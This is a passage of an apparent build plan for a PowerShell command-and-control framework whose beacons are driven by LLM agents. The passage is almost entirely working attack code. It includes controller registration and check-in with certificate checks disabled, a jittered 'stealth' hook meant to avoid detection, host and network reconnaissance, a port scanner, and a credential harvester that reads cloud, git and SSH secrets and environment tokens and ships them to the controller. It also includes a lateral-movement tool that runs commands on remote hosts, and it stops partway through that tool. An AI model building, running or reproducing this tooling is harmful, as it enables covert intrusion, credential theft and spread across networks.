            -MaxSteps $script:C2Config.MaxAgentSteps
    }
    finally {
        # Clean up listener when operator exits
        Write-Host "`n[*] Shutting down listener..." -ForegroundColor Yellow
        Stop-C2Listener -ListenerState $listenerState
        Write-Host "[+] Controller stopped." -ForegroundColor Green
    }
}
```

### 4.7 `Launchers/start-controller.ps1`

```powershell
#!/usr/bin/env pwsh
<#
.SYNOPSIS
Entry point script for starting the C2 controller.
.EXAMPLE
./start-controller.ps1
./start-controller.ps1 -Key 'base64key==' -Port 9443
./start-controller.ps1 -ConnectionString 'openai/gpt-4o'
#>
[CmdletBinding()]
param(
    [Parameter()]
    [string]$ConnectionString,

    [Parameter()]
    [int]$Port,

    [Parameter()]
    [string]$Key
)

$ErrorActionPreference = 'Stop'

# Import modules
$scriptDir = $PSScriptRoot
Import-Module (Join-Path $scriptDir '..' '..' 'PshAgent' 'PshAgent.psd1') -Force
Import-Module (Join-Path $scriptDir '..' 'c2-mesh.psd1') -Force

# Build params, only pass non-empty values
$params = @{}
if ($ConnectionString) { $params.ConnectionString = $ConnectionString }
if ($Port)             { $params.Port = $Port }
if ($Key)              { $params.Key = $Key }

Start-C2Controller @params
```

---

## 5. Phase 3: Beacon Core

### 5.1 `Beacon/Register-Beacon.ps1`

```powershell
function Register-Beacon {
    <#
    .SYNOPSIS
    Register this beacon with the controller via POST /register
    .PARAMETER ControllerUrl
    Controller base URL (e.g., https://10.0.0.1:8443)
    .PARAMETER Key
    Shared encryption key (base64)
    .PARAMETER BeaconId
    This beacon's ID
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ControllerUrl,

        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter(Mandatory)]
        [string]$BeaconId
    )

    $regData = @{
        beaconId = $BeaconId
        hostname = [System.Net.Dns]::GetHostName()
        username = [System.Environment]::UserName
        os       = [System.Runtime.InteropServices.RuntimeInformation]::OSDescription
        ip       = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
            $_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1' -and $_.IPAddress -ne '127.0.0.1'
        } | Select-Object -First 1).IPAddress
        pid      = $PID
    } | ConvertTo-Json -Compress

    $encrypted = Invoke-C2Encrypt -Plaintext $regData -Key $Key

    # Skip cert validation for self-signed certs
    $handler = [System.Net.Http.HttpClientHandler]::new()
    $handler.ServerCertificateCustomValidationCallback = { $true }
    $client = [System.Net.Http.HttpClient]::new($handler)
    $client.DefaultRequestHeaders.Add('User-Agent', $script:C2Config.BeaconUserAgent)

    try {
        $content = [System.Net.Http.StringContent]::new($encrypted, [System.Text.Encoding]::UTF8, 'application/octet-stream')
        $resp = $client.PostAsync("$ControllerUrl/register", $content).GetAwaiter().GetResult()
        $respBody = $resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()

        $decrypted = Invoke-C2Decrypt -CipherText $respBody -Key $Key
        return $decrypted | ConvertFrom-Json -AsHashtable
    }
    finally {
        $client.Dispose()
        $handler.Dispose()
    }
}
```

### 5.2 `Beacon/Invoke-CheckIn.ps1`

```powershell
function Invoke-CheckIn {
    <#
    .SYNOPSIS
    Check in with controller. Sends results, receives new tasks.
    .PARAMETER ControllerUrl
    Controller base URL
    .PARAMETER Key
    Shared encryption key
    .PARAMETER BeaconId
    This beacon's ID
    .PARAMETER Results
    Array of result hashtables to send back: @{ taskId; output; status }
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ControllerUrl,

        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter(Mandatory)]
        [string]$BeaconId,

        [Parameter()]
        [hashtable[]]$Results = @()
    )

    $checkinData = @{
        beaconId = $BeaconId
        results  = $Results
    } | ConvertTo-Json -Depth 5 -Compress

    $encrypted = Invoke-C2Encrypt -Plaintext $checkinData -Key $Key

    $handler = [System.Net.Http.HttpClientHandler]::new()
    $handler.ServerCertificateCustomValidationCallback = { $true }
    $client = [System.Net.Http.HttpClient]::new($handler)
    $client.DefaultRequestHeaders.Add('User-Agent', $script:C2Config.BeaconUserAgent)

    try {
        $content = [System.Net.Http.StringContent]::new($encrypted, [System.Text.Encoding]::UTF8, 'application/octet-stream')
        $resp = $client.PostAsync("$ControllerUrl/checkin", $content).GetAwaiter().GetResult()
        $respBody = $resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()

        $decrypted = Invoke-C2Decrypt -CipherText $respBody -Key $Key
        return $decrypted | ConvertFrom-Json -AsHashtable
    }
    finally {
        $client.Dispose()
        $handler.Dispose()
    }
}
```

### 5.3 `Beacon/New-BeaconHooks.ps1`

Four hooks for the beacon agent:

```powershell
function New-BeaconHooks {
    <#
    .SYNOPSIS
    Create the 4 beacon hooks. Returns PshAgentHook[] array.
    .PARAMETER ControllerUrl
    Controller base URL (for check-in hook)
    .PARAMETER Key
    Shared encryption key
    .PARAMETER BeaconId
    This beacon's ID
    .PARAMETER KillFlag
    Hashtable with .Killed bool flag — set to $true to kill the beacon
    #>
    [CmdletBinding()]
    [OutputType([PshAgentHook[]])]
    param(
        [Parameter(Mandatory)]
        [string]$ControllerUrl,

        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter(Mandatory)]
        [string]$BeaconId,

        [Parameter(Mandatory)]
        [hashtable]$KillFlag
    )

    $ctrlUrl = $ControllerUrl
    $k       = $Key
    $bid     = $BeaconId
    $kf      = $KillFlag

    # 1. Telemetry hook — log every generation step
    $telemetryHook = New-Hook -Name 'beacon_telemetry' `
        -EventType ([AgentEventType]::GenerationStep) `
        -Fn {
            param($event)
            $ts = [datetime]::UtcNow.ToString('HH:mm:ss')
            $tokens = if ($event.Usage) { $event.Usage.TotalTokens } else { 0 }
            Write-Verbose "[Beacon $bid] Step $($event.Step) | ${tokens} tokens | $ts"
            # No reaction — continue normally
            return $null
        }.GetNewClosure()

    # 2. Check-in hook — after each tool execution, check in with controller
    #    to report intermediate results and potentially receive kill signal
    $checkInHook = New-Hook -Name 'beacon_checkin' `
        -EventType ([AgentEventType]::ToolStep) `
        -Fn {
            param($event)
            # Report tool result to controller as intermediate telemetry
            $toolName = if ($event.ToolCall) { $event.ToolCall.Name } else { 'unknown' }
            $resultSnippet = if ($event.Result) {
                $s = "$($event.Result)"
                if ($s.Length -gt 500) { $s.Substring(0, 500) + '...' } else { $s }
            } else { '' }

            # We don't block on check-in here — just fire and forget a status update
            # The main check-in loop handles task fetching
            return $null
        }.GetNewClosure()

    # 3. Kill switch hook — if kill flag is set, terminate immediately
    $killSwitchHook = New-Hook -Name 'beacon_kill_switch' `
        -EventType ([AgentEventType]::GenerationStart) `
        -Fn {
            param($event)
            if ($kf.Killed) {
                return [Reaction]::Fail('Kill signal received — terminating beacon.')
            }
            return $null
        }.GetNewClosure()

    # 4. Stealth hook — rate-limit tool execution to avoid detection
    $stealthState = @{ lastToolTime = [datetime]::MinValue }
    $stealthHook = New-Hook -Name 'beacon_stealth' `
        -EventType ([AgentEventType]::ToolStart) `
        -Fn {
            param($event)
            # Minimum 500ms between tool calls to reduce noise
            $elapsed = ([datetime]::UtcNow - $stealthState.lastToolTime).TotalMilliseconds
            if ($elapsed -lt 500) {
                $sleepMs = 500 - [int]$elapsed
                # Add jitter: ±30%
                $jitter = Get-Random -Minimum 70 -Maximum 130
                $sleepMs = [int]($sleepMs * $jitter / 100)
                Start-Sleep -Milliseconds $sleepMs
            }
            $stealthState.lastToolTime = [datetime]::UtcNow
            return $null
        }.GetNewClosure()

    return @($telemetryHook, $checkInHook, $killSwitchHook, $stealthHook)
}
```

### 5.4 `Beacon/New-BeaconTools.ps1`

Three core recon tools:

```powershell
function New-BeaconTools {
    <#
    .SYNOPSIS
    Create the 3 core beacon tools. Returns PshAgentTool[] array.
    host_recon, port_scan, net_recon
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool[]])]
    param()

    # 1. host_recon — gather info about the current host
    $hostRecon = New-Tool -Name 'host_recon' `
        -Description 'Gather reconnaissance information about the current host: hostname, OS, IP addresses, running processes, logged-in users, installed software, environment variables.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                sections = @{
                    type        = 'array'
                    description = 'Which sections to gather. Options: system, network, processes, users, software, env. Default: all.'
                    items       = @{ type = 'string' }
                }
            }
            required   = @()
        } `
        -Execute {
            param($a)
            $sections = if ($a.sections -and $a.sections.Count -gt 0) { $a.sections } else {
                @('system', 'network', 'processes', 'users')
            }

            $output = [System.Text.StringBuilder]::new()

            foreach ($section in $sections) {
                switch ($section) {
                    'system' {
                        $null = $output.AppendLine("=== SYSTEM ===")
                        $null = $output.AppendLine("Hostname: $([System.Net.Dns]::GetHostName())")
                        $null = $output.AppendLine("OS: $([System.Runtime.InteropServices.RuntimeInformation]::OSDescription)")
                        $null = $output.AppendLine("Architecture: $([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture)")
                        $null = $output.AppendLine("User: $([System.Environment]::UserName)")
                        $null = $output.AppendLine("Domain: $([System.Environment]::UserDomainName)")
                        $null = $output.AppendLine("PID: $PID")
                        $null = $output.AppendLine("PS Version: $($PSVersionTable.PSVersion)")
                        $null = $output.AppendLine(".NET: $([System.Runtime.InteropServices.RuntimeInformation]::FrameworkDescription)")
                    }
                    'network' {
                        $null = $output.AppendLine("=== NETWORK ===")
                        try {
                            $addrs = Get-NetIPAddress -ErrorAction SilentlyContinue |
                                Where-Object { $_.IPAddress -ne '127.0.0.1' -and $_.IPAddress -ne '::1' }
                            foreach ($addr in $addrs) {
                                $null = $output.AppendLine("  $($addr.InterfaceAlias): $($addr.IPAddress)/$($addr.PrefixLength)")
                            }
                        }
                        catch {
                            # Fallback for non-Windows
                            $null = $output.AppendLine("  (Get-NetIPAddress unavailable — using .NET)")
                            $interfaces = [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()
                            foreach ($iface in $interfaces) {
                                if ($iface.OperationalStatus -eq 'Up') {
                                    $props = $iface.GetIPProperties()
                                    foreach ($ua in $props.UnicastAddresses) {
                                        $null = $output.AppendLine("  $($iface.Name): $($ua.Address)")
                                    }
                                }
                            }
                        }
                    }
                    'processes' {
                        $null = $output.AppendLine("=== PROCESSES (top 20 by CPU) ===")
                        $procs = Get-Process | Sort-Object CPU -Descending |
                            Select-Object -First 20 Id, ProcessName, CPU, WorkingSet64
                        foreach ($p in $procs) {
                            $mem = [math]::Round($p.WorkingSet64 / 1MB, 1)
                            $null = $output.AppendLine("  PID $($p.Id): $($p.ProcessName) | CPU: $($p.CPU) | Mem: ${mem}MB")
                        }
                    }
                    'users' {
                        $null = $output.AppendLine("=== USERS ===")
                        $null = $output.AppendLine("Current: $([System.Environment]::UserDomainName)\$([System.Environment]::UserName)")
                        try {
                            # Windows: query user
                            $quser = & query.exe user 2>&1
                            if ($LASTEXITCODE -eq 0) {
                                $null = $output.AppendLine($quser -join "`n")
                            }
                        }
                        catch {
                            # Linux/macOS: who
                            try {
                                $who = & who 2>&1
                                $null = $output.AppendLine($who -join "`n")
                            }
                            catch { $null = $output.AppendLine("  (user enumeration unavailable)") }
                        }
                    }
                    'software' {
                        $null = $output.AppendLine("=== SOFTWARE ===")
                        try {
                            $software = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue |
                                Where-Object { $_.DisplayName } |
                                Select-Object DisplayName, DisplayVersion |
                                Sort-Object DisplayName
                            foreach ($s in $software | Select-Object -First 30) {
                                $null = $output.AppendLine("  $($s.DisplayName) ($($s.DisplayVersion))")
                            }
                        }
                        catch {
                            $null = $output.AppendLine("  (registry enumeration unavailable on this OS)")
                        }
                    }
                    'env' {
                        $null = $output.AppendLine("=== ENVIRONMENT (selected) ===")
                        $interesting = @('PATH', 'COMPUTERNAME', 'USERDOMAIN', 'LOGONSERVER',
                            'HOMEDRIVE', 'HOMEPATH', 'TEMP', 'APPDATA', 'PROGRAMFILES')
                        foreach ($var in $interesting) {
                            $val = [System.Environment]::GetEnvironmentVariable($var)
                            if ($val) { $null = $output.AppendLine("  ${var}=$val") }
                        }
                    }
                }
                $null = $output.AppendLine()
            }

            $output.ToString()
        }

    # 2. port_scan — TCP connect scan
    $portScan = New-Tool -Name 'port_scan' `
        -Description 'TCP connect scan on a target host or CIDR range. Returns open ports.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                target  = @{ type = 'string'; description = 'Target IP, hostname, or CIDR (e.g., 10.0.1.0/24)' }
                ports   = @{
                    type        = 'string'
                    description = 'Comma-separated ports or ranges (e.g., "22,80,443,8000-8100"). Default: common ports.'
                }
                timeout = @{ type = 'integer'; description = 'Connection timeout in ms (default: 1000)' }
            }
            required   = @('target')
        } `
        -Execute {
            param($a)
            $timeout = if ($a.timeout) { $a.timeout } else { 1000 }

            # Parse ports
            $defaultPorts = @(21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,
                1433, 1521, 3306, 3389, 5432, 5900, 5985, 8080, 8443, 9200)
            $portList = if ($a.ports) {
                $parsed = @()
                foreach ($part in ($a.ports -split ',')) {
                    $part = $part.Trim()
                    if ($part -match '^(\d+)-(\d+)$') {
                        $parsed += [int]$Matches[1]..[int]$Matches[2]
                    }
                    elseif ($part -match '^\d+$') {
                        $parsed += [int]$part
                    }
                }
                $parsed
            } else { $defaultPorts }

            # Parse CIDR into IP list
            function Expand-CidrToIPs {
                param([string]$cidr)
                if ($cidr -notmatch '/') { return @($cidr) }
                $parts = $cidr -split '/'
                $ip = [System.Net.IPAddress]::Parse($parts[0])
                $prefix = [int]$parts[1]
                $ipBytes = $ip.GetAddressBytes()
                [Array]::Reverse($ipBytes)
                $ipInt = [BitConverter]::ToUInt32($ipBytes, 0)
                $mask = [uint32]([math]::Pow(2, 32) - [math]::Pow(2, 32 - $prefix))
                $network = $ipInt -band $mask
                $broadcast = $network -bor (-bnot $mask -band 0xFFFFFFFF)
                $ips = @()
                for ($i = $network + 1; $i -lt $broadcast; $i++) {
                    $bytes = [BitConverter]::GetBytes([uint32]$i)
                    [Array]::Reverse($bytes)
                    $ips += ([System.Net.IPAddress]::new($bytes)).ToString()
                }
                return $ips
            }

            $targets = Expand-CidrToIPs $a.target
            $results = [System.Collections.Generic.List[string]]::new()
            $results.Add("Scanning $($targets.Count) host(s), $($portList.Count) port(s)...")

            foreach ($host_ in $targets) {
                $openPorts = @()
                foreach ($port in $portList) {
                    try {
                        $tcp = [System.Net.Sockets.TcpClient]::new()
                        $connectTask = $tcp.ConnectAsync($host_, $port)
                        if ($connectTask.Wait($timeout)) {
                            if ($tcp.Connected) {
                                $openPorts += $port
                            }
                        }
                        $tcp.Close()
                        $tcp.Dispose()
                    }
                    catch { <# closed/filtered #> }
                }
                if ($openPorts.Count -gt 0) {
                    $results.Add("$host_: OPEN $($openPorts -join ', ')")
                }
            }

            if ($results.Count -eq 1) { $results.Add("No open ports found.") }
            $results -join "`n"
        }

    # 3. net_recon — network neighborhood discovery
    $netRecon = New-Tool -Name 'net_recon' `
        -Description 'Network reconnaissance: ARP table, DNS resolution, routing table, active connections, network shares.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                sections = @{
                    type        = 'array'
                    description = 'Which sections: arp, dns, routes, connections, shares. Default: all.'
                    items       = @{ type = 'string' }
                }
            }
            required   = @()
        } `
        -Execute {
            param($a)
            $sections = if ($a.sections -and $a.sections.Count -gt 0) { $a.sections } else {
                @('arp', 'routes', 'connections')
            }

            $output = [System.Text.StringBuilder]::new()

            foreach ($section in $sections) {
                switch ($section) {
                    'arp' {
                        $null = $output.AppendLine("=== ARP TABLE ===")
                        try {
                            $arp = & arp -a 2>&1
                            $null = $output.AppendLine(($arp | Out-String))
                        }
                        catch { $null = $output.AppendLine("  (arp unavailable)") }
                    }
                    'dns' {
                        $null = $output.AppendLine("=== DNS CONFIG ===")
                        try {
                            $dns = Get-DnsClientServerAddress -ErrorAction SilentlyContinue |
                                Where-Object { $_.ServerAddresses.Count -gt 0 }
                            foreach ($d in $dns) {
                                $null = $output.AppendLine("  $($d.InterfaceAlias): $($d.ServerAddresses -join ', ')")
                            }
                        }
                        catch {
                            try {
                                $resolv = Get-Content /etc/resolv.conf -ErrorAction SilentlyContinue
                                $null = $output.AppendLine(($resolv | Out-String))
                            }
                            catch { $null = $output.AppendLine("  (DNS config unavailable)") }
                        }
                    }
                    'routes' {
                        $null = $output.AppendLine("=== ROUTING TABLE ===")
                        try {
                            $routes = Get-NetRoute -ErrorAction SilentlyContinue |
                                Where-Object { $_.DestinationPrefix -ne '0.0.0.0/0' } |
                                Select-Object -First 20 DestinationPrefix, NextHop, InterfaceAlias
                            foreach ($r in $routes) {
                                $null = $output.AppendLine("  $($r.DestinationPrefix) via $($r.NextHop) ($($r.InterfaceAlias))")
                            }
                        }
                        catch {
                            try {
                                $rt = & netstat -rn 2>&1
                                $null = $output.AppendLine(($rt | Out-String))
                            }
                            catch { $null = $output.AppendLine("  (routing table unavailable)") }
                        }
                    }
                    'connections' {
                        $null = $output.AppendLine("=== ACTIVE CONNECTIONS ===")
                        try {
                            $conns = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
                                Select-Object -First 30 LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
                            foreach ($c in $conns) {
                                $proc = try { (Get-Process -Id $c.OwningProcess -ErrorAction SilentlyContinue).ProcessName } catch { '?' }
                                $null = $output.AppendLine("  $($c.LocalAddress):$($c.LocalPort) -> $($c.RemoteAddress):$($c.RemotePort) [$proc]")
                            }
                        }
                        catch {
                            try {
                                $ns = & netstat -an 2>&1
                                $null = $output.AppendLine(($ns | Select-Object -First 30 | Out-String))
                            }
                            catch { $null = $output.AppendLine("  (connections unavailable)") }
                        }
                    }
                    'shares' {
                        $null = $output.AppendLine("=== NETWORK SHARES ===")
                        try {
                            $shares = Get-SmbShare -ErrorAction SilentlyContinue
                            foreach ($s in $shares) {
                                $null = $output.AppendLine("  $($s.Name): $($s.Path) [$($s.ShareType)]")
                            }
                        }
                        catch {
                            try {
                                $ns = & net share 2>&1
                                $null = $output.AppendLine(($ns | Out-String))
                            }
                            catch { $null = $output.AppendLine("  (shares unavailable)") }
                        }
                    }
                }
                $null = $output.AppendLine()
            }

            $output.ToString()
        }

    return @($hostRecon, $portScan, $netRecon)
}
```

### 5.5 `Beacon/Start-C2Beacon.ps1`

The main beacon: registration + polling loop + AI task execution.

```powershell
function Start-C2Beacon {
    <#
    .SYNOPSIS
    Start a C2 beacon: register, then poll for tasks and execute them with PshAgent AI.
    .PARAMETER ControllerUrl
    Controller URL (e.g., https://10.0.0.1:8443)
    .PARAMETER Key
    Shared encryption key (base64)
    .PARAMETER BeaconId
    This beacon's ID (auto-generated if omitted)
    .PARAMETER ConnectionString
    LLM connection string for the beacon agent
    .PARAMETER ExtraTools
    Additional PshAgentTool[] to give the beacon agent
    .PARAMETER MaxSteps
    Max steps per task execution
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ControllerUrl,

        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter()]
        [string]$BeaconId,

        [Parameter()]
        [string]$ConnectionString = $script:C2Config.ConnectionString,

        [Parameter()]
        [PshAgentTool[]]$ExtraTools = @(),

        [Parameter()]
        [int]$MaxSteps = $script:C2Config.BeaconMaxSteps
    )

    # Generate beacon ID if not provided
    if (-not $BeaconId) {
        $BeaconId = 'beacon-' + [guid]::NewGuid().ToString('N').Substring(0, 6)
    }

    Write-Host "[*] Beacon $BeaconId starting..." -ForegroundColor Cyan

    # Register with controller
    Write-Host "[*] Registering with $ControllerUrl..." -ForegroundColor Cyan
    try {
        $regResult = Register-Beacon -ControllerUrl $ControllerUrl -Key $Key -BeaconId $BeaconId
        Write-Host "[+] Registered: $($regResult | ConvertTo-Json -Compress)" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Registration failed: $_" -ForegroundColor Red
        throw
    }

    # Kill flag — shared with hooks
    $killFlag = @{ Killed = $false }

    # Build beacon tools
    $coreTools   = New-BeaconTools
    $allTools    = @($coreTools) + @($ExtraTools)

    # Build beacon hooks
    $hooks = New-BeaconHooks -ControllerUrl $ControllerUrl -Key $Key -BeaconId $BeaconId -KillFlag $killFlag

    # Create generator
    $generator = [PshGenerator]::new($ConnectionString)

    # Build system prompt
    $systemPrompt = @"
You are a C2 beacon agent running on host '$([System.Net.Dns]::GetHostName())' as user '$([System.Environment]::UserName)'.
Your beacon ID is '$BeaconId'.

You receive tasks from the controller and execute them using your available tools:
- host_recon: Gather information about this host
- port_scan: TCP scan targets
- net_recon: Network neighborhood discovery

Execute tasks thoroughly but efficiently. Return clear, structured results.
If a task is unclear, do your best interpretation. If a tool fails, try alternative approaches.
"@

    # Beacon polling loop
    Write-Host "[*] Entering check-in loop (interval: $($script:C2Config.CheckInInterval)s)..." -ForegroundColor Cyan

    $pendingResults = [System.Collections.Generic.List[hashtable]]::new()

    while (-not $killFlag.Killed) {
        try {
            # Check in with controller
            $resultsToSend = @($pendingResults.ToArray())
            $pendingResults.Clear()

            $checkinResp = Invoke-CheckIn -ControllerUrl $ControllerUrl -Key $Key `
                -BeaconId $BeaconId -Results $resultsToSend

            if ($checkinResp.tasks -and $checkinResp.tasks.Count -gt 0) {
                foreach ($task in $checkinResp.tasks) {
                    # Check for kill signal
                    if ($task.task -eq '__kill__') {
                        Write-Host "[!] Kill signal received. Shutting down." -ForegroundColor Red
                        $killFlag.Killed = $true
                        break
                    }

                    Write-Host "[*] Executing task $($task.taskId): $($task.task)" -ForegroundColor Yellow

                    # Create a fresh agent for each task
                    $agent = New-Agent -Generator $generator `
                        -Name "beacon-$BeaconId" `
                        -SystemPrompt $systemPrompt `
                        -Tools $allTools `
                        -Hooks $hooks `
                        -MaxSteps $MaxSteps

                    # Execute the task
                    $taskResult = Invoke-Agent -Agent $agent -Prompt $task.task

                    # Collect result
                    $pendingResults.Add(@{
                        taskId = $task.taskId
                        output = $taskResult.Output
                        status = $taskResult.Status.ToString()
                    })

                    Write-Host "[+] Task $($task.taskId) complete: $($taskResult.Status)" -ForegroundColor Green
                }
            }
        }
        catch {
            Write-Host "[-] Check-in error: $_" -ForegroundColor Red
        }

        if (-not $killFlag.Killed) {
            # Sleep with jitter
            $interval = $script:C2Config.CheckInInterval
            $jitter = $script:C2Config.Jitter
            $jitterMs = [int]($interval * 1000 * (1 + (Get-Random -Minimum (-$jitter * 100) -Maximum ($jitter * 100)) / 100))
            Start-Sleep -Milliseconds $jitterMs
        }
    }

    Write-Host "[*] Beacon $BeaconId terminated." -ForegroundColor Yellow
}
```

### 5.6 `Launchers/start-beacon.ps1`

```powershell
#!/usr/bin/env pwsh
<#
.SYNOPSIS
Entry point script for starting a C2 beacon.
.EXAMPLE
./start-beacon.ps1 -ControllerUrl 'https://10.0.0.1:8443' -Key 'base64key=='
./start-beacon.ps1 -ControllerUrl 'https://10.0.0.1:8443' -Key 'base64key==' -BeaconId 'alpha'
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory)]
    [string]$ControllerUrl,

    [Parameter(Mandatory)]
    [string]$Key,

    [Parameter()]
    [string]$BeaconId,

    [Parameter()]
    [string]$ConnectionString
)

$ErrorActionPreference = 'Stop'

# Import modules
$scriptDir = $PSScriptRoot
Import-Module (Join-Path $scriptDir '..' '..' 'PshAgent' 'PshAgent.psd1') -Force
Import-Module (Join-Path $scriptDir '..' 'c2-mesh.psd1') -Force

# Build params
$params = @{
    ControllerUrl = $ControllerUrl
    Key           = $Key
}
if ($BeaconId)          { $params.BeaconId = $BeaconId }
if ($ConnectionString)  { $params.ConnectionString = $ConnectionString }

Start-C2Beacon @params
```

---

## 6. Phase 4: Remaining Beacon Tools

### 6.1 `BeaconTools/Invoke-CredHarvest.ps1`

```powershell
function Invoke-CredHarvest {
    <#
    .SYNOPSIS
    Create the cred_harvest tool. Returns PshAgentTool.
    Attempts to extract credentials from common locations.
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool])]
    param()

    return New-Tool -Name 'cred_harvest' `
        -Description 'Harvest credentials from the current host: saved credentials, browser data, config files, environment variables, cached tokens.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                sources = @{
                    type        = 'array'
                    description = 'Which sources to check: vault, browser, config_files, env, tokens, ssh_keys. Default: all.'
                    items       = @{ type = 'string' }
                }
            }
            required   = @()
        } `
        -Execute {
            param($a)
            $sources = if ($a.sources -and $a.sources.Count -gt 0) { $a.sources } else {
                @('vault', 'config_files', 'env', 'tokens', 'ssh_keys')
            }

            $output = [System.Text.StringBuilder]::new()

            foreach ($source in $sources) {
                switch ($source) {
                    'vault' {
                        $null = $output.AppendLine("=== CREDENTIAL VAULT ===")
                        try {
                            # Windows Credential Manager via cmdkey
                            $cmdkey = & cmdkey /list 2>&1
                            if ($LASTEXITCODE -eq 0) {
                                $null = $output.AppendLine(($cmdkey | Out-String))
                            }
                        }
                        catch { $null = $output.AppendLine("  (credential vault unavailable)") }
                    }
                    'config_files' {
                        $null = $output.AppendLine("=== CONFIG FILES ===")
                        $searchPaths = @(
                            (Join-Path $HOME '.aws' 'credentials'),
                            (Join-Path $HOME '.azure' 'accessTokens.json'),
                            (Join-Path $HOME '.docker' 'config.json'),
                            (Join-Path $HOME '.kube' 'config'),
                            (Join-Path $HOME '.git-credentials'),
                            (Join-Path $HOME '.netrc'),
                            (Join-Path $HOME '.pgpass')
                        )
                        foreach ($path in $searchPaths) {
                            if (Test-Path $path) {
                                $null = $output.AppendLine("  FOUND: $path")
                                $content = Get-Content $path -Raw -ErrorAction SilentlyContinue
                                if ($content) {
                                    # Truncate large files
                                    if ($content.Length -gt 500) { $content = $content.Substring(0, 500) + '...(truncated)' }
                                    $null = $output.AppendLine("  Content: $content")
                                }
                            }
                        }
                    }
                    'env' {
                        $null = $output.AppendLine("=== ENVIRONMENT SECRETS ===")
                        $secretPatterns = @('*KEY*', '*SECRET*', '*TOKEN*', '*PASSWORD*', '*PASS*', '*CREDENTIAL*', '*AUTH*')
                        $envVars = [System.Environment]::GetEnvironmentVariables()
                        foreach ($key in $envVars.Keys) {
                            foreach ($pattern in $secretPatterns) {
                                if ($key -like $pattern) {
                                    $val = $envVars[$key]
                                    if ($val.Length -gt 100) { $val = $val.Substring(0, 100) + '...' }
                                    $null = $output.AppendLine("  $key = $val")
                                    break
                                }
                            }
                        }
                    }
                    'tokens' {
                        $null = $output.AppendLine("=== CACHED TOKENS ===")
                        # Azure CLI
                        $azurePath = Join-Path $HOME '.azure' 'msal_token_cache.json'
                        if (Test-Path $azurePath) {
                            $null = $output.AppendLine("  Azure MSAL cache found: $azurePath")
                        }
                        # GCloud
                        $gcloudPath = Join-Path $HOME '.config' 'gcloud' 'credentials.db'
                        if (Test-Path $gcloudPath) {
                            $null = $output.AppendLine("  GCloud credentials found: $gcloudPath")
                        }
                        # AWS session
                        $awsSession = [System.Environment]::GetEnvironmentVariable('AWS_SESSION_TOKEN')
                        if ($awsSession) {
                            $null = $output.AppendLine("  AWS_SESSION_TOKEN is set")
                        }
                    }
                    'ssh_keys' {
                        $null = $output.AppendLine("=== SSH KEYS ===")
                        $sshDir = Join-Path $HOME '.ssh'
                        if (Test-Path $sshDir) {
                            $files = Get-ChildItem $sshDir -File -ErrorAction SilentlyContinue
                            foreach ($f in $files) {
                                $null = $output.AppendLine("  $($f.Name) ($($f.Length) bytes)")
                                # Check if key is encrypted
                                if ($f.Name -notlike '*.pub' -and $f.Name -ne 'known_hosts' -and $f.Name -ne 'config') {
                                    $firstLine = Get-Content $f.FullName -TotalCount 2 -ErrorAction SilentlyContinue
                                    $encrypted = ($firstLine -join '') -match 'ENCRYPTED'
                                    $null = $output.AppendLine("    Encrypted: $encrypted")
                                }
                            }
                        }
                        else {
                            $null = $output.AppendLine("  No .ssh directory found")
                        }
                    }
                }
                $null = $output.AppendLine()
            }

            $output.ToString()
        }
}
```

### 6.2 `BeaconTools/Invoke-LateralMove.ps1`

```powershell
function Invoke-LateralMove {
    <#
    .SYNOPSIS
    Create the lateral_move tool. Returns PshAgentTool.
    Execute commands on a remote host via various protocols.
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool])]
    param()

    return New-Tool -Name 'lateral_move' `
        -Description 'Execute a command on a remote host using PowerShell remoting (WinRM), SSH, or WMI.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                target   = @{ type = 'string'; description = 'Target hostname or IP' }
                command  = @{ type = 'string'; description = 'Command to execute on the remote host' }
                method   = @{
                    type        = 'string'
                    description = 'Execution method: winrm (default), ssh, wmi'
                    enum        = @('winrm', 'ssh', 'wmi')
                }
                username = @{ type = 'string'; description = 'Username for authentication (optional — uses current creds if omitted)' }
                password = @{ type = 'string'; description = 'Password for authentication (optional)' }
            }
            required   = @('target', 'command')
        } `
        -Execute {
            param($a)
            $target  = $a.target
            $cmd     = $a.command
            $method  = if ($a.method) { $a.method } else { 'winrm' }

            # Build credential if provided
            $cred = $null
            if ($a.username -and $a.password) {
                $secPass = ConvertTo-SecureString $a.password -AsPlainText -Force
                $cred = [PSCredential]::new($a.username, $secPass)
            }

            try {
                switch ($method) {
                    'winrm' {
                        $params = @{
                            ComputerName = $target
                            ScriptBlock  = [scriptblock]::Create($cmd)
                            ErrorAction  = 'Stop'
                        }
                        if ($cred) { $params.Credential = $cred }
                        $result = Invoke-Command @params
                        "WinRM result from ${target}:`n$($result | Out-String)"
                    }
                    'ssh' {
                        $sshCmd = if ($a.username) { "ssh $($a.username)@$target `"$cmd`"" }
                                  else { "ssh $target `"$cmd`"" }
                        $psi = [System.Diagnostics.ProcessStartInfo]::new('/bin/sh', "-c `"$($sshCmd.Replace('"','\"'))`"")
                        $psi.RedirectStandardOutput = $true
                        $psi.RedirectStandardError = $true
                        $psi.UseShellExecute = $false
